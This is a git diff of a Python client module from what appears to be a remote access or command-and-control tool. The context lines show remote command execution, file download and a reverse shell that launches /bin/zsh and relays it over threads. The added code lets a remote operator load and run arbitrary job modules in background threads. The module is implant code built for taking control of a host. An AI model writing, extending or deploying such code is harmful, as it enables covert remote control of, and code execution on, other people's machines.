@@ -1,4 +1,5 @@
 import contextlib
+import glob
 import inspect
 import io
 import locale
@@ -9,7 +10,7 @@ import sys
 import threading
 import time
 
-from client.config.config import SERVER_ADDR
+from client.config.config import SERVER_ADDR, JOB_PATH
 from client.commands.CommandBase import CommandBase
 from client.util.decorator import desc
 from common.util import format_dict, logger
@@ -26,7 +27,7 @@ class CommonCommands(CommandBase):
             if not line:
                 break
             # 将读取的字节转换为字符串，并去除行尾的换行符
-            self.send_interim_result(1, line.decode(locale.getdefaultlocale()[1]).strip('\n'))
+            self._send_interim_result(1, line.decode(locale.getdefaultlocale()[1]).strip('\n'))
 
     @desc('change directory')
     def cd(self, path):
@@ -70,7 +71,7 @@ class CommonCommands(CommandBase):
         # 等待命令完成
         cmd.wait()
         time.sleep(0.1)
-        self.send_final_result(1, "Command completed successfully")
+        self._send_final_result(1, "Command completed successfully")
 
     @desc('download file')
     def download(self, filename):
@@ -149,9 +150,9 @@ class CommonCommands(CommandBase):
         elif os.name == 'posix':
             interpreter = '/bin/zsh'
         if not interpreter:
-            self.send_final_result(0, 'Interpreter not found', 1)
+            self._send_final_result(0, 'Interpreter not found', 1)
 
-        self.send_final_result(1, 'Reverse shell thread being started', 1)
+        self._send_final_result(1, 'Reverse shell thread being started', 1)
 
         p = subprocess.Popen(interpreter, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 
@@ -175,3 +176,92 @@ class CommonCommands(CommandBase):
 
         threading.Thread(target=send, daemon=True).start()
         threading.Thread(target=recv).start()
+
+    @desc('start a job in new thread')
+    def start_job(self, job_name: str):
+        """
+        Start a job in a new thread. If no job name is provided, list all available jobs.
+
+        Args:
+            job_name: Name of the job to start (with or without .py extension)
+
+        Returns:
+            Tuple: (status_code, message) if listing jobs
+        Raises:
+            ValueError: For invalid operations
+            RuntimeError: For job execution issues
+        """
+
+        job_name = job_name.strip()
+
+        # List available jobs if no argument provided
+        if not job_name:
+            job_dir = os.path.join(JOB_PATH)
+            modules = [
+                os.path.relpath(f, job_dir).replace('\\', '/')
+                for f in glob.iglob(os.path.join(job_dir, '**/*.py'), recursive=True)
+            ]
+            return 1, '\n'.join(modules)
+
+        # Normalize job name
+        if not job_name.endswith('.py'):
+            job_name += '.py'
+
+        base_name = os.path.splitext(os.path.basename(job_name))[0]
+
+        # Validate before execution
+        if base_name == 'module':
+            raise ValueError('Base module cannot be executed directly')
+
+        if base_name in self.jobs and self.jobs.get(base_name).is_running:
+            raise RuntimeError(f'Job "{base_name}" is already running')
+
+        self._send_interim_result(1, f'Preparing to start job: {base_name}')
+
+        try:
+            # Start job execution flow
+            job_instance = self._dynamic_import(job_name)
+            job_thread = threading.Thread(
+                target=job_instance.run,
+                name=f'JobThread-{base_name}'
+            )
+            job_thread.start()
+
+            self._send_final_result(
+                1,
+                f'Job thread started (name: {job_thread.name})\n'
+                f'Use "stop_job {base_name}" to stop execution'
+            )
+        except Exception as e:
+            raise RuntimeError(f'Failed to start job "{base_name}": {str(e)}')
+
+    @desc('stop a running job')
+    def stop_job(self, job_name: str):
+        """
+        Stop a running job.
+
+        Args:
+            job_name: Name of the job to stop (with or without .py extension)
+
+        Returns:
+            Tuple: (status_code, message)
+        """
+        job_name = job_name.strip()
+
+        # List available jobs if no argument provided
+        if not job_name:
+            return 1, '\n'.join(self.jobs)
+
+        # Normalize job name
+        if job_name.endswith('.py'):
+            job_name = job_name[:-3]
+
+        if job_name not in self.jobs:
+            return 0, f'Job "{job_name}" is not currently running'
+
+        job_instance = self.jobs[job_name]
+        if job_instance.is_running:
+            job_instance.stop()
+
+        self.jobs.pop(job_name)
+        return 1, f'Successfully stopped job: {job_name}'
